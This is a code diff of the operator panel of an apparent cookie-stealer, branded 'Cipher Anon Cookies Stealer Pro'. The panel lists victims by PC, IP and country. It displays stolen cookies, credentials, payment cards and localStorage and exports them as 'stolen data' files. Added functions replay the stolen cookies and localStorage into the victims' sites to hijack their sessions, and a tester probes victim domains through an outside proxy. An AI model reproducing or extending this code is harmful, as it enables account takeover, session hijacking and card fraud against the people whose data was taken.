+                const hasStorage = pc.totalStorage > 0;
 
-                const ua = entry.fingerprint?.userAgent || '';
-                let browser = 'Unknown';
-                if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-                else if (ua.includes('Edg')) browser = 'Edge';
-                else if (ua.includes('Firefox')) browser = 'Firefox';
-                else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-                else if (ua.includes('Opera')) browser = 'Opera';
-                else if (ua.includes('Brave')) browser = 'Brave';
-                else if (ua.includes('PowerShell')) browser = 'PowerShell';
+                let domainTags = '';
+                Object.keys(pc.domains).forEach(domain => {
+                    const d = pc.domains[domain];
+                    domainTags += `<span class="domain-tag">${domain} <span class="count">(${d.cookies}🍪)</span></span>`;
+                });
 
                 html += `
-                    <div class="victim-card" onclick="openModalForEntry('${entry._uniqueId}')">
-                        <button class="v-delete" onclick="event.stopPropagation(); showDeleteConfirm('${entry._uniqueId}', '${domain}')" title="Delete victim">🗑️</button>
+                    <div class="victim-card" onclick="openPCModalAll('${pcName}')">
+                        <button class="v-delete" onclick="event.stopPropagation(); showDeletePCConfirm('${pcName}')" title="Delete PC">🗑️</button>
                         <div class="v-header">
                             <span class="flag">${flag}</span>
-                            <span class="ip">${entry.ip || 'Unknown'}</span>
+                            <span class="ip">${pc.ip}</span>
+                            <span class="pc-name">🖥️ ${pcName}</span>
                         </div>
                         <div class="v-details">
-                            <span class="domain">${domain}</span>
-                            <span>${entry.country || 'Unknown'}</span>
-                            <span class="time" title="${fullTime}">🕐 ${time}</span>
+                            <span class="country">${pc.country}</span>
+                            <span class="time">🕐 ${timeAgo(pc.latestTime)}</span>
+                            <span>👤 ${pc.totalVictims} victims</span>
                         </div>
-                        <div class="v-cookies">🍪 ${cookieCount} cookies ${extras}${entry.city && entry.city !== 'N/A' ? '· 📍 ' + entry.city : ''}</div>
-                        <div style="font-size:9px;color:#64748b;margin-top:2px;">🌐 ${browser}</div>
+                        <div class="v-domain-list">${domainTags}</div>
+                        <div class="v-actions">
+                            <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayAllCookiesPC('${pcName}')` : ''}" title="${hasCookies ? 'Replay all cookies' : 'No cookies'}">▶️ All Cookies</button>
+                            <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayAllStoragePC('${pcName}')` : ''}" title="${hasStorage ? 'Replay all storage' : 'No storage'}">💾 All Storage</button>
+                            <button class="btn-sm test-sm" onclick="event.stopPropagation(); testPC('${pcName}')">🔍 Test</button>
+                            <button class="btn-sm download" onclick="event.stopPropagation(); downloadPCTxt('${pcName}')">📝</button>
+                            <button class="btn-sm view" onclick="event.stopPropagation(); openPCModalAll('${pcName}')">👁️</button>
+                        </div>
                     </div>
                 `;
             });
-
             grid.innerHTML = html;
+        }
+
+        // ============================================================
+        // REPLAY VIEW — PC GROUPED
+        // ============================================================
+
+        function renderReplayView() {
+            const grid = document.getElementById('replayGrid');
+            const grouped = groupByPC(allData);
+            const pcNames = Object.keys(grouped);
+
+            if (pcNames.length === 0) {
+                grid.innerHTML = `<div class="empty-state"><div class="icon">▶️</div><h3>No victims to replay</h3></div>`;
+                return;
+            }
+
+            let html = '';
+            pcNames.forEach(pcName => {
+                const pc = grouped[pcName];
+                const flag = getFlagEmoji(pc.countryCode);
+                const hasCookies = pc.totalCookies > 0;
+                const hasStorage = pc.totalStorage > 0;
+
+                let domainTags = '';
+                Object.keys(pc.domains).forEach(domain => {
+                    const d = pc.domains[domain];
+                    domainTags += `<span class="domain-tag">${domain} <span class="count">(${d.cookies}🍪)</span></span>`;
+                });
+
+                html += `
+                    <div class="replay-card">
+                        <div class="r-header">
+                            <span class="flag">${flag}</span>
+                            <span class="ip">${pc.ip}</span>
+                            <span class="pc-name">🖥️ ${pcName}</span>
+                            <span style="font-size:9px;color:#475569;margin-left:auto;">👤 ${pc.totalVictims}</span>
+                        </div>
+                        <div class="r-stats">
+                            <span class="cookies">🍪 ${pc.totalCookies}</span>
+                            <span class="storage">💾 ${pc.totalStorage}</span>
+                            <span class="creds">🔐 ${pc.totalCreds}</span>
+                            <span class="cards">💳 ${pc.totalCards}</span>
+                        </div>
+                        <div class="r-domain-list">${domainTags}</div>
+                        <div class="r-actions">
+                            <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayAllCookiesPC('${pcName}')` : ''}" title="${hasCookies ? 'Replay all cookies' : 'No cookies'}">▶️ All Cookies</button>
+                            <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayAllStoragePC('${pcName}')` : ''}" title="${hasStorage ? 'Replay all storage' : 'No storage'}">💾 All Storage</button>
+                            <button class="btn-sm test-sm" onclick="event.stopPropagation(); testPC('${pcName}')">🔍 Test</button>
+                            <button class="btn-sm download" onclick="event.stopPropagation(); downloadPCTxt('${pcName}')">📝</button>
+                            <button class="btn-sm view" onclick="event.stopPropagation(); openPCModalAll('${pcName}')">👁️</button>
+                        </div>
+                    </div>
+                `;
+            });
+            grid.innerHTML = html;
+        }
+
+        // ============================================================
+        // PC-LEVEL REPLAY FUNCTIONS
+        // ============================================================
+
+        function replayAllCookiesPC(pcName) {
+            const grouped = groupByPC(allData);
+            const pc = grouped[pcName];
+            if (!pc) { showToast('❌ PC not found', 'error'); return; }
+
+            // Get first domain with cookies
+            let firstDomain = null;
+            let allCookies = {};
+            Object.keys(pc.domains).forEach(domain => {
+                const d = pc.domains[domain];
+                if (d.cookies > 0 && !firstDomain) {
+                    firstDomain = domain;
+                    d.entries.forEach(entry => {
+                        Object.assign(allCookies, entry.cookies || {});
+                    });
+                }
+            });
+
+            if (Object.keys(allCookies).length === 0) {
+                showToast('❌ No cookies found for this PC', 'error');
+                return;
+            }
+            if (!firstDomain || firstDomain.includes('railway.app') || firstDomain.includes('up.railway') || firstDomain === 'unknown') {
+                showToast('⚠️ No valid domain for replay', 'error');
+                return;
+            }
+
+            const win = window.open('', '_blank');
+            if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
+            const cleanDomain = firstDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying all cookies for <strong>${pcName}</strong> on ${cleanDomain}...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(allCookies).length} cookies</p>
+                <script>
+                    const cookies = ${JSON.stringify(allCookies)};
+                    Object.entries(cookies).forEach(([name, value]) => {
+                        try { document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('▶️ Replaying ' + pcName + ' on ' + cleanDomain + ' (' + Object.keys(allCookies).length + ' cookies)', 'success');
+        }
+
+        function replayAllStoragePC(pcName) {
+            const grouped = groupByPC(allData);
+            const pc = grouped[pcName];
+            if (!pc) { showToast('❌ PC not found', 'error'); return; }
+
+            let firstDomain = null;
+            let allStorage = {};
+            Object.keys(pc.domains).forEach(domain => {
+                const d = pc.domains[domain];
+                if (d.storage > 0 && !firstDomain) {
+                    firstDomain = domain;
+                    d.entries.forEach(entry => {
+                        Object.assign(allStorage, entry.localStorage || {});
+                    });
+                }
+            });
+
+            if (Object.keys(allStorage).length === 0) {
+                showToast('❌ No LocalStorage found for this PC', 'error');
+                return;
+            }
+            if (!firstDomain || firstDomain.includes('railway.app') || firstDomain.includes('up.railway') || firstDomain === 'unknown') {
+                showToast('⚠️ No valid domain for replay', 'error');
+                return;
+            }
+
+            const win = window.open('', '_blank');
+            if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
+            const cleanDomain = firstDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#8b5cf6;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#8b5cf6;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying all LocalStorage for <strong>${pcName}</strong> on ${cleanDomain}...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(allStorage).length} items</p>
+                <script>
+                    const storage = ${JSON.stringify(allStorage)};
+                    Object.entries(storage).forEach(([key, value]) => {
+                        try { localStorage.setItem(key, value); } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('💾 Replaying ' + pcName + ' on ' + cleanDomain + ' (' + Object.keys(allStorage).length + ' items)', 'success');
+        }
+
+        function testPC(pcName) {
+            const grouped = groupByPC(allData);
+            const pc = grouped[pcName];
+            if (!pc) { showToast('❌ PC not found', 'error'); return; }
+
+            let domain = Object.keys(pc.domains)[0];
+            if (!domain || domain.includes('railway.app') || domain.includes('up.railway') || domain === 'unknown') {
+                showToast('⚠️ No valid domain to test', 'error');
+                return;
+            }
+            const cleanDomain = domain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            window.open('https://' + cleanDomain, '_blank');
+            showToast('🔍 Opened ' + cleanDomain + ' in new tab', 'success');
+        }
+
+        function openPCModalAll(pcName) {
+            const grouped = groupByPC(allData);
+            const pc = grouped[pcName];
+            if (!pc || pc.entries.length === 0) { showToast('❌ No victims found', 'error'); return; }
+            openModalForEntry(pc.entries[0]._uniqueId);
         }
 
         // ============================================================
@@ -2228,6 +2970,7 @@
             let totalCookies = 0;
             let totalCreds = 0;
             let totalCards = 0;
+            let totalStorage = 0;
 
             data.forEach((entry, idx) => {
                 const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
@@ -2236,19 +2979,23 @@
                 const city = entry.city || 'N/A';
                 const time = entry.receivedAt ? formatFullTime(entry.receivedAt) : 'Unknown';
                 const browser = entry.browser || entry.fingerprint?.browser || 'Unknown';
+                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                 const cookies = entry.cookies || {};
                 const creds = entry.credentials || [];
                 const cards = entry.cards || [];
+                const storage = entry.localStorage || {};
 
                 const cookieCount = Object.keys(cookies).length;
                 const credCount = creds.length;
                 const cardCount = cards.length;
+                const storageCount = Object.keys(storage).length;
                 totalCookies += cookieCount;
                 totalCreds += credCount;
                 totalCards += cardCount;
+                totalStorage += storageCount;
 
                 lines.push(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
-                lines.push(`  VICTIM #${idx + 1}`);
+                lines.push(`  VICTIM #${idx + 1} — PC: ${pc}`);
                 lines.push(`  Domain:   ${domain}`);
                 lines.push(`  IP:       ${ip}`);
                 lines.push(`  Country:  ${country} (${city})`);
@@ -2257,9 +3004,9 @@
                 lines.push(`  Cookies:  ${cookieCount}`);
                 lines.push(`  Creds:    ${credCount}`);
                 lines.push(`  Cards:    ${cardCount}`);
+                lines.push(`  Storage:  ${storageCount}`);
                 lines.push('');
 
-                // Cookies
                 if (cookieCount > 0) {
                     lines.push(`  ─── COOKIES (${cookieCount}) ───`);
                     Object.entries(cookies).forEach(([name, value]) => {
@@ -2269,7 +3016,6 @@
                     lines.push('');
                 }
 
-                // Credentials
                 if (credCount > 0) {
                     lines.push(`  ─── CREDENTIALS (${credCount}) ───`);
                     creds.forEach(c => {
@@ -2283,7 +3029,6 @@
                     });
                 }
 
-                // Cards
                 if (cardCount > 0) {
                     lines.push(`  ─── CARDS (${cardCount}) ───`);
                     cards.forEach(c => {
@@ -2299,6 +3044,15 @@
                     });
                 }
 
+                if (storageCount > 0) {
+                    lines.push(`  ─── LOCALSTORAGE (${storageCount}) ───`);
+                    Object.entries(storage).forEach(([key, value]) => {
+                        const v = value.length > 60 ? value.slice(0, 60) + '...' : value;
+                        lines.push(`    ${key} = ${v}`);
+                    });
+                    lines.push('');
+                }
+
                 lines.push('');
             });
 
@@ -2309,6 +3063,7 @@
             lines.push(`  Total Cookies:  ${totalCookies}`);
             lines.push(`  Total Creds:    ${totalCreds}`);
             lines.push(`  Total Cards:    ${totalCards}`);
+            lines.push(`  Total Storage:  ${totalStorage}`);
             lines.push(sep);
             lines.push(`  Exported by Cipher Anon Cookies Stealer Pro`);
             lines.push(sep);
@@ -2317,10 +3072,7 @@
         }
 
         function downloadTxt() {
-            if (allData.length === 0) {
-                showToast('❌ No data to export', 'error');
-                return;
-            }
+            if (allData.length === 0) { showToast('❌ No data to export', 'error'); return; }
             const content = formatTxt(allData, 'CIPHER ANON — ALL STOLEN DATA');
             const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
             const url = URL.createObjectURL(blob);
@@ -2335,10 +3087,7 @@
         }
 
         function downloadModalTxt() {
-            if (!currentModalEntry) {
-                showToast('❌ No victim loaded', 'error');
-                return;
-            }
+            if (!currentModalEntry) { showToast('❌ No victim loaded', 'error'); return; }
             const content = formatTxt([currentModalEntry], `VICTIM — ${currentModalDomain}`);
             const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
             const url = URL.createObjectURL(blob);
@@ -2352,30 +3101,8 @@
             showToast('📥 Victim TXT exported', 'success');
         }
 
-        function downloadDomainTxt(domain) {
-            const entries = allData.filter(e => {
-                const d = e.fingerprint?.hostname || e.domain || 'unknown';
-                return d === domain;
-            });
-            if (entries.length === 0) {
-                showToast('❌ No victims for this domain', 'error');
-                return;
-            }
-            const content = formatTxt(entries, `DOMAIN — ${domain} (${entries.length} victims)`);
-            const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `domain_${domain}_${new Date().toISOString().slice(0,10)}.txt`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast(`📥 Domain TXT exported (${entries.length} victims)`, 'success');
-        }
-
         // ============================================================
-        // MODAL — WITH DELETE BUTTON + TXT
+        // MODAL
         // ============================================================
 
         function openModalForEntry(uniqueId) {
@@ -2392,12 +3119,13 @@
             if (!entry) { showToast('❌ Victim not found', 'error'); return; }
 
             currentModalEntry = entry;
+            const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
             currentModalDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
 
             const overlay = document.getElementById('modalOverlay');
             const isTrash = source === 'trash';
-            const title = isTrash ? `🗑️ ${currentModalDomain} — Deleted` :
-                          `👤 ${currentModalDomain} — Victim Details`;
+            const title = isTrash ? `🗑️ ${pc} — ${currentModalDomain} (Deleted)` :
+                          `👤 ${pc} — ${currentModalDomain}`;
 
             document.getElementById('modalTitle').textContent = title;
 
@@ -2419,6 +3147,8 @@
             const cookieEntries = Object.entries(cookies);
             const creds = entry.credentials || [];
             const cards = entry.cards || [];
+            const storage = entry.localStorage || {};
+            const storageEntries = Object.entries(storage);
 
             const deleteBtn = isTrash ?
                 `<button class="btn-icon-sm delete-sm" onclick="showPermanentDeleteConfirm('${entry._uniqueId}')">🗑️</button>` :
@@ -2429,17 +3159,24 @@
                 '';
 
             const txtBtn = `<button class="btn-icon-sm txt" onclick="downloadModalTxt()">📝</button>`;
+            const cookieReplayBtn = `<button class="btn-icon-sm replay-cookies" onclick="replaySession('${currentModalDomain}')">▶️</button>`;
+            const storageReplayBtn = `<button class="btn-icon-sm replay-storage" onclick="replayStorage('${currentModalDomain}')">💾</button>`;
+            const testBtn = `<button class="btn-icon-sm test-sm" onclick="testSession('${currentModalDomain}')">🔍</button>`;
 
             let html = `
                 <div class="victim-entry">
                     <div class="modal-actions">
                         ${restoreBtn}
                         ${deleteBtn}
+                        ${cookieReplayBtn}
+                        ${storageReplayBtn}
+                        ${testBtn}
                         ${txtBtn}
                     </div>
                     <div class="victim-header">
                         <span class="flag">${flag}</span>
                         <span class="ip">${entry.ip}</span>
+                        <span class="pc-label">🖥️ ${pc}</span>
                         <span class="country">${entry.country}</span>
                         <span class="city">📍 ${entry.city}</span>
                         <span style="font-size:10px;color:#94a3b8;margin-left:4px;">🌐 ${browser}</span>
@@ -2450,7 +3187,6 @@
                         </span>
                     </div>
 
-                    <!-- COOKIES -->
                     <div class="data-section">
                         <div class="section-title">🍪 Cookies (${cookieEntries.length})</div>
                         ${cookieEntries.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cookies</div>' : ''}
@@ -2471,7 +3207,6 @@
                         }).join('')}
                     </div>
 
-                    <!-- CREDENTIALS -->
                     <div class="data-section">
                         <div class="section-title">🔐 Credentials (${creds.length})</div>
                         ${creds.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No credentials</div>' : ''}
@@ -2500,7 +3235,6 @@
                         }).filter(Boolean).join('')}
                     </div>
 
-                    <!-- CARDS -->
                     <div class="data-section">
                         <div class="section-title">💳 Cards (${cards.length})</div>
                         ${cards.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No cards</div>' : ''}
@@ -2532,6 +3266,32 @@
                             `;
                         }).filter(Boolean).join('')}
                     </div>
+
+                    <div class="data-section">
+                        <div class="section-title">💾 LocalStorage (${storageEntries.length})</div>
+                        ${storageEntries.length === 0 ? '<div style="color:#475569;font-size:10px;padding:2px 0;">No LocalStorage</div>' : ''}
+                        ${storageEntries.map(([key, value]) => {
+                            let browserLabel = 'Unknown';
+                            let cleanKey = key;
+                            if (key.includes(':')) {
+                                const parts = key.split(':');
+                                browserLabel = parts[0];
+                                cleanKey = parts.slice(1).join(':');
+                            }
+                            const escaped = value.replace(/'/g, "\\'");
+                            return `
+                                <div class="data-item">
+                                    <span class="label" style="color:#8b5cf6;">${cleanKey}</span>
+                                    <span class="value" title="${value}">${value.length > 50 ? value.slice(0,50)+'...' : value}</span>
+                                    <span class="badge-storage">${browserLabel}</span>
+                                    <div class="actions">
+                                        <button class="btn-icon-sm copy" onclick="copyText('${escaped}')">📋</button>
+                                        <button class="btn-icon-sm download" onclick="downloadItem('${cleanKey}', '${escaped}', 'localstorage')">⬇️</button>
+                                    </div>
+                                </div>
+                            `;
+                        }).join('')}
+                    </div>
                 </div>
             `;
 
@@ -2540,77 +3300,201 @@
             overlay.classList.add('active');
         }
 
-        function openModal(domain, stats, source) {
-            if (stats.entries && stats.entries.length > 0) {
-                openModalForEntry(stats.entries[0]._uniqueId);
-                return;
-            }
-            showToast('❌ No victim data', 'error');
-        }
-
         function closeModal() {
             document.getElementById('modalOverlay').classList.remove('active');
         }
 
         // ============================================================
-        // DELETE DOMAIN CONFIRM
+        // SESSION REPLAY (legacy domain-based)
         // ============================================================
 
-        function showDeleteDomainConfirm(domain) {
-            const count = allData.filter(e => {
-                const d = e.fingerprint?.hostname || e.domain || 'unknown';
-                return d === domain;
-            }).length;
-            showCustomConfirm(
-                'Delete Domain',
-                `Delete ALL ${count} victims from ${domain}?`,
-                '🗑️',
-                () => { deleteDomain(domain); },
-                true
-            );
-        }
-
-        async function deleteDomain(domain) {
-            const toDelete = allData.filter(e => {
-                const d = e.fingerprint?.hostname || e.domain || 'unknown';
-                return d === domain;
+        function replaySession(domain) {
+            let cookies = {};
+            let actualDomain = domain;
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
+                    actualDomain = entryDomain;
+                }
             });
-
-            let deleted = 0;
-            for (const entry of toDelete) {
-                if (entry._uniqueId) {
-                    try {
-                        const res = await fetch(`/api/delete/${entry._uniqueId}`, { method: 'DELETE' });
-                        if (res.status === 401) { window.location.href = '/login.php'; return; }
-                        const data = await res.json();
-                        if (data.status === 'ok') deleted++;
-                    } catch (e) {}
+            if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                for (const entry of allData) {
+                    const ed = entry.fingerprint?.hostname || entry.domain || '';
+                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
+                        actualDomain = ed;
+                        cookies = {};
+                        Object.assign(cookies, entry.cookies || {});
+                        break;
+                    }
                 }
             }
-            showToast(`🗑️ Deleted ${deleted} victims from ${domain}`, 'success');
-            await fetchData();
-            await fetchTrash();
+            if (Object.keys(cookies).length === 0) { showToast('❌ No valid domain', 'error'); return; }
+            const win = window.open('', '_blank');
+            if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
+                <script>
+                    const cookies = ${JSON.stringify(cookies)};
+                    Object.entries(cookies).forEach(([name, value]) => {
+                        try { document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('▶️ Replay started for ' + cleanDomain, 'success');
+        }
+
+        function replayStorage(domain) {
+            let storage = {};
+            let actualDomain = domain;
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(storage, entry.localStorage || {});
+                    actualDomain = entryDomain;
+                }
+            });
+            if (Object.keys(storage).length === 0) { showToast('❌ No storage found', 'error'); return; }
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                for (const entry of allData) {
+                    const ed = entry.fingerprint?.hostname || entry.domain || '';
+                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
+                        actualDomain = ed;
+                        storage = {};
+                        Object.assign(storage, entry.localStorage || {});
+                        break;
+                    }
+                }
+            }
+            if (Object.keys(storage).length === 0) { showToast('❌ No valid domain', 'error'); return; }
+            const win = window.open('', '_blank');
+            if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            win.document.write(`
+                <!DOCTYPE html>
+                <html><head><title>Loading ${cleanDomain}...</title>
+                <style>body{background:#0a0a0a;color:#8b5cf6;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#8b5cf6;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
+                <div class="s"></div>
+                <p>Replaying LocalStorage for <strong>${cleanDomain}</strong>...</p>
+                <p style="font-size:11px;color:#475569;">${Object.keys(storage).length} items</p>
+                <script>
+                    const storage = ${JSON.stringify(storage)};
+                    Object.entries(storage).forEach(([key, value]) => {
+                        try { localStorage.setItem(key, value); } catch(e) {}
+                    });
+                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
+                <\/script>
+            </body></html>
+            `);
+            win.document.close();
+            showToast('💾 Replay started for ' + cleanDomain, 'success');
+        }
+
+        function replayFromModal() {
+            if (currentModalDomain) replaySession(currentModalDomain);
+        }
+
+        function replayStorageFromModal() {
+            if (currentModalDomain) replayStorage(currentModalDomain);
+        }
+
+        function testFromModal() {
+            if (currentModalDomain) testSession(currentModalDomain);
         }
 
         // ============================================================
-        // PASSWORD VISIBILITY TOGGLE
+        // TEST FUNCTIONS
         // ============================================================
 
-        function togglePasswordVis(key, elementId) {
-            passwordVisibility[key] = !passwordVisibility[key];
-            const el = document.getElementById(elementId);
-            if (el) {
-                if (passwordVisibility[key]) {
-                    el.classList.remove('password-hidden');
-                    el.textContent = el.dataset.originalValue || el.textContent;
-                } else {
-                    el.classList.add('password-hidden');
-                    el.textContent = el.textContent.replace(/[^\s]/g, '•');
+        async function testSession(domain) {
+            let cookies = {};
+            let actualDomain = domain;
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
+                    actualDomain = entryDomain;
+                }
+            });
+            if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                for (const entry of allData) {
+                    const ed = entry.fingerprint?.hostname || entry.domain || '';
+                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
+                        actualDomain = ed;
+                        break;
+                    }
                 }
             }
-            if (el && !el.dataset.originalValue) {
-                el.dataset.originalValue = el.textContent;
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            window.open('https://' + cleanDomain, '_blank');
+            const resultMsg = document.getElementById('testResultModal');
+            if (resultMsg) {
+                resultMsg.className = 'test-result show valid';
+                resultMsg.textContent = `✅ ${cleanDomain} — Opened in new tab`;
             }
+            showToast('🔍 Opened ' + cleanDomain + ' in new tab', 'success');
+            const btn = document.querySelector('.modal .session-actions .test');
+            if (btn) { btn.textContent = '🔍'; btn.style.opacity = '1'; btn.disabled = false; }
+        }
+
+        async function testAllDomains() {
+            if (isTestingAll) return;
+            isTestingAll = true;
+            const container = document.getElementById('testerResults');
+            container.innerHTML = '<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ Testing...</div>';
+            const domains = new Set();
+            allData.forEach(entry => {
+                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (domain && !domain.includes('railway.app') && !domain.includes('up.railway') && domain !== 'unknown') {
+                    domains.add(domain);
+                }
+            });
+            if (domains.size === 0) {
+                container.innerHTML = '<div style="color:#64748b;font-size:12px;text-align:center;">No valid domains</div>';
+                isTestingAll = false;
+                return;
+            }
+            let results = [];
+            let tested = 0;
+            const total = domains.size;
+            for (const domain of domains) {
+                try {
+                    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://${domain}`)}`;
+                    const response = await fetch(proxyUrl, { signal: AbortSignal.timeout(8000) });
+                    results.push({ domain, valid: response.ok || response.status < 400, message: `✅ Valid (${response.status})` });
+                } catch (e) {
+                    results.push({ domain, valid: true, message: `⚠️ Check manually` });
+                }
+                tested++;
+                container.innerHTML = `<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ ${tested}/${total}</div>`;
+            }
+            let html = '';
+            const validCount = results.filter(r => r.valid).length;
+            html += `<div style="color:#64748b;font-size:11px;margin-bottom:6px;">✅ ${validCount} reachable · ⚠️ ${results.length - validCount} check manually</div>`;
+            results.forEach(r => {
+                const color = r.valid ? '#00ff88' : '#ff4444';
+                const icon = r.valid ? '✅' : '⚠️';
+                html += `
+                    <div style="display:flex;justify-content:space-between;align-items:center;background:#0b0f1a;padding:4px 10px;border-radius:4px;border:1px solid ${r.valid ? '#1a2538' : '#2a1a1a'};">
+                        <span style="color:#e2e8f0;font-size:12px;">${r.domain}</span>
+                        <span style="color:${color};font-size:11px;">${icon} ${r.message}</span>
+                    </div>
+                `;
+            });
+            container.innerHTML = html;
+            isTestingAll = false;
+            showToast(`✅ ${validCount} reachable, ${results.length - validCount} check manually`, 'success');
         }
 
         // ============================================================
@@ -2634,12 +3518,7 @@
         }
 
         function downloadItem(name, value, type) {
-            const data = {
-                name: name,
-                value: value,
-                type: type,
-                exportedAt: new Date().toISOString()
-            };
+            const data = { name: name, value: value, type: type, exportedAt: new Date().toISOString() };
             const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -2653,275 +3532,20 @@
             showToast(`📥 ${type} downloaded`, 'success');
         }
 
-        // ============================================================
-        // SESSION REPLAY
-        // ============================================================
-
-        function populateReplayDomains() {
-            const select = document.getElementById('replayDomainSelect');
-            const domains = new Set();
-            allData.forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                domains.add(domain);
-            });
-
-            if (domains.size === 0) {
